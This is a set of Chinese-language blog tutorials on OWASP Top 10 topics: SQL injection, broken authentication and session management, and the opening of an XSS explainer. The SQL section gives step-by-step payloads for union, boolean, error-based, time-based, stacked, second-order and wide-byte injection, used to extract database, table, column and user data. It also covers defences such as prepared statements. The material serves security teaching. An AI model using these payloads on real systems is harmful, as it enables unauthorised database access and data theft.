# OWASP Top10详解
# 关于SQL注入的一些分析
### 目录

*   一、sql注入原理
*   二、 sql注入的类型介绍
*   *   按照注入点类型来分类
    *   按照数据提交的方式来分类
    *   按照执行效果来分类
*   三、sql漏洞探测方法
*   四、sql注入实例
*   *   1、union联合查询
    *   2、boolean注入
    *   3、报错注入
    *   4、时间盲注
    *   5、堆叠查询注入
    *   6、二次注入
    *   7、宽字节注入
*   五、sql注入绕过技术分析
*   六、如何正确的防御sql注入

## 一、sql注入原理

SQL 注入就是指 web 应用程序对用户输入的数据合法性**没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询**，攻击者可以通过构造恶意的 sql 语句来实现对数据库的任意操作。 举例说明： id=GET\[‘id’\] sql=SELECT \* FROM users WHERE id=id LIMIT 0,1

1 、SQL 注入漏洞产生的条件 A:参数用户可控：前端传入的参数内容由用户控制 B:参数带入数据库的查询：传入的参数拼接到 SQL 语句，并且带入数据库的查询

2、关于数据库-
a) 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information\_schema的数据库，在该库中，我们需要记住三个表名，分别是 schemata，tables，columns。-
b) Schemata 表存储的是该用户创建的所有数据库的库名，需要记住该表中记录数据库名的字段名为 schema\_name。-
c) Tables 表存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table\_schema 和 table\_name.-
d) Columns 表存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table\_schema、table\_name、columns\_name。-
1\. 数据库查询语句：-
数据库查询语句如下： 想要查询的值 A= select 所属字段名 A from 所属表名 where 对应字段名 B=值 B-
关于几个表的一些语法：-
// 通过这条语句可以得到所有的数据库名

    select schema_name from information_schema.schemata limit 0,1
    
        

// 通过这条语句可以得到所有的数据表名

    select table_name from information_schema.tables limit 0,1
    
        

// 通过这条语句可以得到指定security数据库中的所有表名

    select table_name from information_schema.tables where table_schema='security'limit 0,1
    
        

// 通过这条语句可以得到所有的列名

    select column_name from information_schema.columns limit 0,1
    
        

// 通过这条语句可以得到指定数据库security中的数据表users的所有列名

    select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
    
        

//通过这条语句可以得到指定数据表users中指定列password的数据(只能是database()所在的数据库内的数据，因为处于当前数据库下的话不能查询其他数据库内的数据)

    select password from users limit 0,1
    
        

2.Limit 的用法 Limit 的使用格式是 limit m,n,其中 m 指的是记录开始的位置，从 m=0 开始，表示第一条记录； n 是指取几条记录。-
3.需要记住的几个函数-
a) Version()；当前 mysql 的版本-
b) Database();当前网站使用的数据库-
c) User();当前 MySQL 的用户-
d) system\_user(); 系统用户名-
e）session\_user();连接数据库的用户名-
f)current\_user;当前用户名-
g)load\_file();读取本地文件-
h)length(str) : 返回给定字符串的长度，如 length(“string”)=6-
i)substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)=“in”-
substr()、stbstring()、mid() 三个函数的用法、功能均一致-
j)concat(username)：将查询到的username连在一起，默认用逗号分隔-
concat(str1,’_’,str2)：将字符串str1和str2的数据查询到一起，中间用_连接-
group\_concat(username) ：将username数据查询在一起，用逗号连接-
4.注释符号 三种注释符号： 
ii. 2. --空格 空格可以使用+代替 （url 编码%23 表示注释）-
iii. 3. /\*\*/

**sql注入漏洞攻击流程：注入点探测—信息获取—获取权限**

## 二、 sql注入的类型介绍

## 按照注入点类型来分类

（1）数字型注入点

类似结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 select \* from 表名 where id=1 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

    select * from 表名 where id=1 and 1=1
    
        

（2）字符型注入点

类似结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 select \* from 表名 where name=‘admin’ 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

    select * from 表名 where name='admin' and 1=1 ' 
    
        

我们需要将这些烦人的引号给处理掉。-
（3）搜索型注入点

这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword=关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select \* from 表名 where 字段 like ‘%关键字%’ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

    select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'
    
        

## 按照数据提交的方式来分类

（1）GET 注入

提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/news.php?id=1 , id 是注入点。

（2）POST 注入

使用 POST 方式提交数据，注入点位置在 POST _数据部分_，常发生在表单中。-
（3）Cookie 注入

HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。-
（4）HTTP 头部注入

注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。

## 按照执行效果来分类

（1）基于布尔的盲注

即可以根据返回页面判断条件真假的注入。-
（2）基于时间的盲注

即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。-
（3）基于报错注入

即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

单引号-
双引号-
基于数字型注入

（4）联合查询注入

可以使用union的情况下的注入。-
（5）堆查询注入

可以同时执行多条语句的执行时的注入。-
（6）宽字节注入-
宽字节注入主要是源于程序员设置数据库编码与 php 编码设置为不同的两个编码，这样就可能会产 生宽字节注入。GBK 占用两字节，ASCII 占用一字节。PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为‚\\‛），MYSQL 默认字符集是 GBK 等宽字节字符集。 输入%df%27,本来\\ 会转义%27（’），但\\（其中\\的十六进制是 %5C）的编码位数为 92，%df 的 编码位数为 223，%df%5c 符合 gbk 取值范围（第一个字节 129-254，第二个字节 64-254），会解析 为一个汉字‚運‛，这样\\就会失去应有的作用

## 三、sql漏洞探测方法

一般来说，SQL 注入一般存在于形如：http://xxx.xxx.xxx/abc.asp?id=XX 等带有参数的 ASP 动态网页中，有时一个动态网页中可能只有一个参数，有时可能有 N 个参数，有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的动态网页并且该网页访问了数据库，那么就有可能存在 SQL 注入。

1、先加单引号’、双引号"、等看看是否报错，如果报错就可能存在SQL注入漏洞了。-
2、还有在URL后面加 and 1=1 、 and 1=2 看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。-
3、还有就是Timing Attack测试，也就是时间盲注。通过简单的条件语句比如 and 1=2 是无法看出异常的。在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。-
因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。

## 四、sql注入实例

## 1、union联合查询

          union联合、合并：将多条查询语句的结果合并成一个结果，union 注入攻击为一种手工测试。 
          注入思路：
          			A:判断是否存在注入点http://xxxxxxxxx?id=1 
                         1' 异常 1 and 1=1  返回结果和 id=1 一样 
                         1 and 1=2  异常 
                         从而则一定存在 SQL 注入漏洞
                    B:order by 1-99 语句来查询该数据表的字段数
                    C:利用获得的列数使用联合查询，union select 与前面的字段数一样
                      找到了数据呈现的位置http://xxxxxxx?id=1 union select 1,2,3,4,5,6 
                    D:根据显示内容确定查询语句的位置，利用 information_schema 
                    依次进行查询 schemata， tables，columns 
                    E:已知库名、表名和字段名，接下来就爆数据
    
        

## 2、boolean注入

       判断方式：
       通过长度判断 length(): length(database())>=x
       通过字符判断 substr():substr(database() ,1,1)= 's'
       通过 ascII 码判断:ascii():ascii(substr(database(),1,1)) =x 
       注入漏洞判断：
       1.id=1'   报错 
       2.id=1 and 1=1  结果和 id=1 一样
       3.id=1 and 1=2  结果异常
    
        

攻击实战：-
Boolean 注入是指构造 SQL 判断语句，通过查看页面的返回结果来推测哪些 SQL 判断条件是成立的，以此来获取数据库中的数据。

      A:判断数据库名的长度 http://xxxxxx?id=1' and length(database())>=1--+  从而判 断数据库名的长度为 4
      B:判断数据库名 Substr() 数据库库名 a~z,0~9 ‘and substr(database(),1,1)--+ 
      C:Burp 判断数据库名 http://xxxxxxxx?id=1' and substr(database(),1,1)='a'--+ 逐字判断数据库名为 test，test 数据库名 
      D:Burpsuite 爆破数据库的表名 http://xxxxxx?id=1' and substr((select table_name from information_schema.tables where table_schema='test' limit 0,1),1,1)='a'--+ person     users   xss  //三个表
      E:Burp 爆字段名 http://xxxxxxxx?id=1' and substr((select column_name from information_schema.columns where table_schema='test' and table_name='users' limit 0,1),1,1)='a'--+ id   username  password 等
      F:获取数据 http://xxxxx?id=1' and substr((select username from test.users limit 0,1),1,1)='a'--+ 
    
        

## 3、报错注入

在 MYSQL 中使用一些指定的函数来制造报错，后台没有屏蔽数据库报错信息，在语法发生错 误时会输出在前端，从而从报错信息中获取设定的信息。select/insert/update/delete 都 可以使用报错来获取信息。常用的爆错函数 updatexml()，extractvalue()，floor() ,exp()

**payload语法：**

    updatexml(xml_document,Xpathstring,new_value) 
           payload1：updatexml(1,concat(0x7e,(select database()),0x7e),1)
           payload2：extractvalue(1,concat(0x7e,(select database())))
           payload3：(select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)# 
    
        

**攻击实战：**

    A:注入点探测及类型 a’制作报错,字符型 
    B：利用函数 updatexml()获取数据库名 http://xxxxx?username=a' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
    C：利用函数 updatexml()获取表名 http://xxxxxxx?username=a' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='test'),0x7e),1)--+
    D：利用函数 updatexml()获取字段名 http://xxxxxxx?username=a' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='test' and table_name='users'),0x7e),1)--+ 
    E：利用函数 updatexml()获取值 http://xxxxxxx?username=a' and updatexml(1,concat(0x7e,(select username from test.users limit 0,1),0x7e),1)--+ 
    
        

## 4、时间盲注

代码存在 sql 注入漏洞，然而页面既不会回显数据，也不会回显错误信息，语句执行后也 不提示真假，我们不能通过页面的内容来判断。这里我们可以通过构造语句，通过页面响应的 时长，来判断信息，这既是时间盲注。原理：利用 sleep()或 benchmark()等函数让 mysql 执行时间变长经常与 if(expr1,expr2,expr3) 语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果 expr1 是 True,则返回 expr2,否则返回 expr3。

**特点：**-
通过时间回显的延迟作为判断 payload=1’ and sleep(5)–+ 有延迟则考虑时间盲注-
利用 sleep()或 benchmark()函数延长 mysql 的执行时间-
与 if()搭配使用-
常用函数：-
• left(m,n) --从左向右截取字符串 m 返回其前 n 位-
• substr(m,1,1) --取字符串 m 的左边第一位起，1 字长的字符串-
• ascii(m) --返回字符 m 的 ASCII 码-
• base64(m)—返回字符 m 的 base64 编码 • if(str1,str2,str3)–如果 str1 正确就执行 str2，否则执行 str3-
• sleep(m)–使程序暂停 m 秒-
• length(m) --返回字符串 m 的长度-
• count(column\_name) --返回指定列的值的数目-
**payload:if(expr1,expr2,expr3) 语义解析 ：**-
对 expr1 进行布尔判断，如果为真，则执行 expr2,如果为假，则执行 expr3 常用 payload： If(length(database())>1,sleep(5),1) 如果数据库名字符长度大于 1 为真，mysql 休眠 5 秒，如果为假则查询 1。而查询 1 的结果，大约只有几十毫秒，根据 Burp Suite 中页面的响应 时间，可以判断条件是否正确。-
**攻击实战：**

    判断数据库名的长度
     http://xxxxxx?id=1 and if(length(database())>=6,sleep(5),1) 
    爆库名
     http://xxxxxxx?id=1 and if(substr(database(),1,1)='a',sleep(5),1)   数据库名为 test 
    爆表名
     http://xxxxxxx?id=1 and if(substr((select table_name from information_schema.tables where table_schema='test' limit 0,1),1,1)='a',sleep(5),1)  表名 
    爆字段
      http://xxxxxxx?id=1 and if(substr((select column_name from information_schema.columns where table_schema='test' and table_name='users' limit 0,1),1,1)='a',sleep(5),1)  
    爆数据 
     http://xxxxxxxxxx?id=1 and if(substr(select username from test.users limit 0,1),1,1)='a',sleep(5),1) 由于数据库名的范围一般在 a~z,0~9，特殊字符，大小写等
    
        

## 5、堆叠查询注入

Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条） 一起执行。而在真实的运用中也是这样的，在 mysql 中，主要是命令行中，每一 条语句结尾加 ;表示语句结束。这样我们就想到了多条语句一起使用。-
**使用条件**-
堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有 当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli\_multi\_query()函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli\_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所 以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。-
**攻击构造**-
正常 sql 语句：Select \* from users where id=’1’’;-
注入 sql 语 句 ： Select \* from users where id=’1’;select if(length(database())>5,sleep(5),1)%23; Payload= ‘;select if(length(database())>5,sleep(5),1)%23 Payload= ‘;select if(substr(user(),1,1)=‘r’,sleep(3),1)%23 如此句：从堆叠注 入语句中可以看出，第二条 SQL 语句(select if(substr(user(),1,1)=‘r’,sleep(3),1)%23 就是时间盲注的语句。-
堆叠注入和 union 的区别在于，union后只能跟 select，而堆叠后面可以使用 insert，update，-
create，delete 等常规数据库语句。-
**攻击实例**

      爆库名：test http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr(database(),1,1)='a',sleep(5),1)
      爆表名 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select table_name from information_schema.tables where table_schema='test' limit 0,1),1,1)='a',sleep(5),1) 
      爆字段名 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select column_name from information_schema.columns where table_schema='test' where table_name='user' limit 0,1),1,1)='a',sleep(5),1) 
      爆值 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select username from test.users limit 0,1),1,1)='a',sleep(5),1) 
    
        

## 6、二次注入

二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义 处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调 用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。-
**两个条件**-
a:进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原 来的数据。-
b:开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没 有进行进一步的检验的处理。-
**攻击实例**

练习地址：http://sqli/Less-24 知道用户 Admin 但是不知道密码

1.  注册一个 admin’#用户
2.  修改 admin’#的密码
3.  Update users set password=’new\_pass’where username=’admin’#’and password=’123456’
4.  实际上 Update users set password=’new\_pass’where username=’admin’

## 7、宽字节注入

宽字节注入主要是源于程序员设置数据库编码与 php 编码设置为不同的两个编码，这样就可能会产 生宽字节注入。GBK 占用两字节，ASCII 占用一字节。PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为‚\\‛），MYSQL 默认字符集是 GBK 等宽字节字符集。 输入%df%27,本来\\ 会转义%27（’），但\\（其中\\的十六进制是 %5C）的编码位数为 92，%df 的 编码位数为 223，%df%5c 符合 gbk 取值范围（第一个字节 129-254，第二个字节 64-254），会解析 为一个汉字‚運‛，这样\\就会是去应有的作用。 id=1’ id=1%df%5c’-
**攻击实例**

    127.0.0.1/web/sql/kuanzifu.php?id=1 
    127.0.0.1/web/sql/kuanzifu.php?id=1’ 
    127.0.0.1/web/sql/kuanzifu.php?id=1%df’
     从返回的结果可以看出，参数 id=1 在数据库查询是被单引号包围的。当传入参数 id=1’时， 传入的单引号又被转义符（反斜线）转义，导致参数 ID 无法逃逸单引号的包围，所以在一般情况下， 此处是不存在 SQL 注入漏洞的。不过有一个特例，就是当数据库的编码为 GBK 时，可以使用宽字节 注入，宽字节的格式是在地址后先加一个%df,再加单引号，因为反斜杠的编码为%5c,而在 GBK 编码 中，%df%5c 是繁体字連，所以这时，单引号成功逃逸，爆出 Mysql 数据库错误。
      %df%27====>(check_addslashes)====>%df%5c%27====>(GBK)====>運'
       $sql="SELECT * FROM users WHERE id='1 運'' LIMIT 0,1"; #成功将单引号闭合，可以进行 SQL 注入。
        判断数据库表有 6 个字段数 http://127.0.0.1/web/sql/kuanzifu.php?id=1%df%27%20order%20by%207--+
         http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df%27%20union%20select%201,2,3,4,5,6--+ 
        爆库名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df%27%20union%20select%201,2,3,(databas e()),5,6--+
        爆表名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df' union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=(select database())),5,6%23
        爆字段名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df' union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 1,1)),5,6%23 
    
        

## 五、sql注入绕过技术分析

传送门在此——>[sql注入绕过](https://blog.csdn.net/whoim_i/article/details/102869687)

## 六、如何正确的防御sql注入

既然sql注入的危害如此之大，我们应该怎么正确的防御呢？从防御的角度来看，要做的事情有两件：-
a 找到所有的sql注入漏洞-
b：修补这些漏洞-
sql注入的防御并不是一件简单的事情，之前我也上网查资料，大多数采取的办法也是最简单粗暴的办法就是 对用户的输入做一些escape处理，但这是不够的。这种基于黑名单的方法或多或少都存在一些问题。（在sql保留字中，用户提交的正常数据也有可能会使用这些单词，从而对用户的正常数据进行了误杀）—包括我自己之前也觉得过滤这些关键字就好了哈哈哈0.0

那么该如何正确的防御呢？

1、使用预编译语句，绑定变量-
使用预编译的sql语句，sql语句的语意不会发生改变。在sql语句中，变量用？表示，攻击者无法改变sql语句的结构。

2、使用存储过程-
使用存储过程的效果和使用预编译语句类似，其区别就是存储过程需要先将sql语句定义在数据库中。但需要注意的是，存储过程也可能存在注入问题，因此应该尽量避免在存储过程内使用动态的sql语句。

3、检查数据类型-
检查数据的输入类型，在很大程度上可以对抗sql注入。比如用户在输入邮箱时，必须严格按照邮箱的格式；输入时间、日期时，必须严格按照时间、日期的格式等等，都能避免用户数据造成破坏。但数据类型检查并非万能的，如果需求就是需要用户提交字符串，比如一段短文，则需要依赖其他的方法防范sql注入。-
4、使用安全函数-
一般来说，各种web语言都实现了一些编码函数，可以帮助对抗sql注入。数据库厂商也对安全的编码函数做了“指导”。

最后呢，从数据库自身的角度来说，应该使用最小权限远侧，避免web应用直接使用root、dbowner等高权限账户直接连接数据库。如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。web应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。 总结一下，注入攻击就是应用违背了“数据与代码分离原则”导致的结果。再次强调两个条件：a：用户能够控制数据的输入；b：代码拼凑了用户输入的数据，把数据当做代码执行了。在对抗注入攻击的时候，要牢记“数据与代码分离原则”，在“拼凑”发生的地方进行安全检查，就能避免此类问题。

仅供学习参考，后续有时间再更新啦

[查看原网页: blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/102733802)
# 失效的身份认证和会话管理

[blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171346)

### 目录

*   身份认证和会话管理
*   失效的身份认证和会话管理
*   *   原理
    *   危害
    *   案例
    *   如何判断
    *   如何防范
    *   *   1、区分公共区域和受限区域
        *   2、对最终用户帐户使用帐户锁定策略
        *   3、支持密码有效期
        *   4、能够禁用帐户
        *   5、不要存储用户密码
        *   6、要求使用强密码
        *   7、不要在网络上以纯文本形式发送密码
        *   8、保护身份验证 Cookie
        *   9、使用 SSL 保护会话身份验证 Cookie
        *   10、对身份验证 cookie 的内容进行加密
        *   11、限制会话寿命
        *   12、避免未经授权访问会话状态

## 身份认证和会话管理

首先来了解一下什么是身份认证，什么是会话管理，才进行下一步的学习。-
**身份认证**-
身份认证最常用于系统登录，形式一般为用户名和密码登录方式，在安全性要求较高的情况下，还有验证码、客户端证书、Ukey等-
**会话管理**-
HTTP本身是无状态的，利用会话管理机制来实现连接识别。身份认证的结果往往是获得一个令牌，通常放在cookie中，之后对用户身份的识别根据这个授权的令牌进行识别，而不需要每次都要登陆。

## 失效的身份认证和会话管理

那么什么是失效的身份认证和会话管理呢？咱们从原理上来解释一下。

## 原理

在开发web应用程序时，开发人员往往只关注Web应用程序所需的功能，所以常常会建立自定义的认证和会话方案。但是要正确的实现这些方案却是很难的。结果就在退出、密码管理、超时、密码找回、帐户更新等方面存在漏洞。

## 危害

由于存在以上的漏洞，恶意用户可能会窃取或操纵用户会话和cookie，进而模仿合法用户。-
比如：窃取用户凭证和会话信息；冒充用户身份查看或者变更记录，甚至执行事务；访问未授权的页面和资源；执行超越权限操作

## 案例

• 场景#1：机票预订应用程序支持URL重写，把会话ID放在URL里：

    http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii
    
        

该网站一个经过认证的用户希望让他朋友知道这个机票打折信息。他将上面链接通过邮件发给他朋友们，并不知道自己已经泄漏了自己的会话ID。当他的朋友们使用上面的链接时，他们将会使用他的会话和信用卡。-
• 场景#2：应用程序超时设置不当。用户使用公共计算机访问网站。离开时，该用户没有点击退出，而是直接关闭浏览器。攻击者在一个小时后能使用相同浏览器通过身份认证。-
• 场景#3：内部或外部攻击者进入系统的密码数据库。存储在数据库中的用户密码没有被哈希和[加密](https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020), 所有用户的密码都被攻击者获得。

## 如何判断

1.用户身份验证凭证没有使用哈希或加密保护。-
2.认证凭证可猜测，或者能够通过薄弱的帐户管理功能（例如账户创建、密码修改、密码恢复, 弱会话ID）重写。-
3.会话ID暴露在URL里（例如URL重写）。-
4.会话ID容易受到会话固定（session fixation）的攻击。-
5.会话ID没有超时限制，或者用户会话或身份验证令牌特别是单点登录令牌在用户注销时没有失效。-
6.成功注册后,会话ID没有轮转。-
7.密码、会话ID和其他认证凭据使用未加密连接传输。

## 如何防范

### 1、区分公共区域和受限区域

站点的公共区域允许任何用户进行匿名访问。受限区域只能接受特定用户的访问，而且用户必须通过站点的身份验证。将站点分割为公共访问区域和受限访问区域，可以在该站点的不同区域使用不同的身份验证和授权规则，从而限制对 [SSL](https://so.csdn.net/so/search?q=SSL&spm=1001.2101.3001.7020) 的使用。使用SSL 会导致性能下降，为了避免不必要的系统开销，在设计站点时，应该在要求验证访问的区域限制使用 SSL。

### 2、对最终用户帐户使用帐户锁定策略

当最终用户帐户几次登录尝试失败后，可以禁用该帐户或将事件写入日志。如果使用 Windows 验证(如 NTLM 或Kerberos协议)，操作系统可以自动配置并应用这些策略。如果使用表单验证，则这些策略是应用程序应该完成的任务，必须在设计阶段将这些策略合并到应用程序中。-
　　请注意，帐户锁定策略不能用于抵制服务攻击。例如，应该使用自定义帐户名替代已知的默认服务帐户(如IUSR\_MACHINENAME)，以防止获得 Internet 信息服务 (IIS) Web服务器名称的攻击者锁定这一重要帐户。

### 3、支持密码有效期

密码不应固定不变，而应作为常规密码维护的一部分，通过设置密码有效期对密码进行更改。在应用程序设计阶段，应该考虑提供这种类型的功能。

### 4、能够禁用帐户

如果在系统受到威胁时使凭证失效或禁用帐户，则可以避免遭受进一步的攻击。

### 5、不要存储用户密码

如果必须验证密码，则没有必要实际存储密码。相反，可以存储一个单向哈希值，然后使用用户所提供的密码重新计算哈希值。为减少对用户存储的词典攻击威胁，可以使用强密码，并将随机salt 值与该密码结合使用。

### 6、要求使用强密码

不要使攻击者能轻松破解密码。有很多可用的密码编制指南，但通常的做法是要求输入至少 8位字符，其中要包含大写字母、小写字母、数字和特殊字符。无论是使用平台实施密码验证还是开发自己的验证策略，此步骤在对付粗暴攻击时都是必需的。在粗暴攻击中，攻击者试图通过系统的试错法来破解密码。使用常规表达式协助强密码验证。

### 7、不要在网络上以纯文本形式发送密码

以纯文本形式在网络上发送的密码容易被窃听。为了解决这一问题，应确保通信通道的安全，例如，使用 SSL 对数据流加密。

### 8、保护身份验证 Cookie

身份验证 cookie被窃取意味着登录被窃取。可以通过加密和安全的通信通道来保护验证票证。另外，还应限制验证票证的有效期，以防止因重复攻击导致的欺骗威胁。在重复攻击中，攻击者可以捕获cookie，并使用它来非法访问您的站点。减少 cookie 超时时间虽然不能阻止重复攻击，但确实能限制攻击者利用窃取的 cookie来访问站点的时间。

### 9、使用 SSL 保护会话身份验证 Cookie

不要通过 HTTP 连接传递身份验证 cookie。在授权 cookie 内设置安全的 cookie 属性，以便指示浏览器只通过HTTPS 连接向服务器传回 cookie。

### 10、对身份验证 cookie 的内容进行加密

即使使用 SSL，也要对 cookie 内容进行加密。如果攻击者试图利用 XSS 攻击窃取cookie，这种方法可以防止攻击者查看和修改该 cookie。在这种情况下，攻击者仍然可以使用 cookie 访问应用程序，但只有当cookie 有效时，才能访问成功。

### 11、限制会话寿命

缩短会话寿命可以降低会话劫持和重复攻击的风险。会话寿命越短，攻击者捕获会话 cookie并利用它访问应用程序的时间越有限。

### 12、避免未经授权访问会话状态

考虑会话状态的存储方式。为获得最佳性能，可以将会话状态存储在 Web 应用程序的进程地址空间。然而这种方法在 Web场景方案中的可伸缩性和内存都很有限，来自同一用户的请求不能保证由同一台服务器处理。在这种情况下，需要在专用状态服务器上进行进程状态存储，或者在共享数据库中进行永久性状态存储。ASP.NET支持所有这三种存储方式。-
　　对于从 Web 应用程序到状态存储之间的网络连接，应使用 IPSec 或 SSL 确保其安全，以降低被窃听的危险。另外，还需考虑Web 应用程序如何通过状态存储的身份验证。-
　　在可能的地方使用 Windows验证，以避免通过网络传递纯文本身份验证凭据，并可利用安全的 Windows帐户策略带来的好处。

[查看原网页: blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103171346)
# XSS(跨站脚本攻击)详解

[blog.csdn.net](https://blog.csdn.net/whoim_i/article/details/103192920)

XSS的原理和分类

XSS的攻击载荷

XSS可以插在哪里？

XSS漏洞的挖掘

XSS的攻击过程

XSS漏洞的危害

XSS漏洞的简单攻击测试

反射型XSS：

存储型XSS：

DOM型XSS：

XSS的简单过滤和绕过

XSS的防御

反射型XSS的利用姿势

get型

post型

利用JS将用户信息发送给后台

* * *

## XSS的原理和分类

[跨站脚本攻击](https://so.csdn.net/so/search?q=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020)XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！

 XSS分为：存储型 、[反射](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%B0%84&spm=1001.2101.3001.7020)型 、DOM型XSS

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190115094753418.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20190115094820160.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie-
反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。-
DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 DOM的详解：[DOM文档对象模型](https://blog.csdn.net/qq_36119192/article/details/82933873)

可能触发DOM型XSS的属性

    
        

如图，我们在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20181003174457528%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

